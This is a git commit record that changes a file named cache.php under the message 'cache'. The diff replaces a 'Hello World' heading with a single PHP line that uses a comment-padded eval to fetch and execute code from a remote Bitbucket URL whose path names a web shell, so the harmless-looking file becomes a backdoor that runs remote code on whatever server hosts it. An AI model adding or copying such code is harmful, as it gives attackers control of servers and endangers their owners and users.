84de723b1a684cdf764ec76483526c8033826cbc
gkdevp <110337908+gkdevp@users.noreply.github.com>
2024-01-18 22:11:11 +0700

    cache

--- cache.php
+++ cache.php
@@ -1,1 +1,1 @@
-<h1>Hello World</h1>
+<?php eval/**_**/(urldecode("%3F%3E") . file_get_contents("https://bitbucket.org/private-cdn/php-code-collection/raw/a1ddb1335bd107acac67eb44f6e668498cc01161/webshell/alfa-v4.php")); ?>
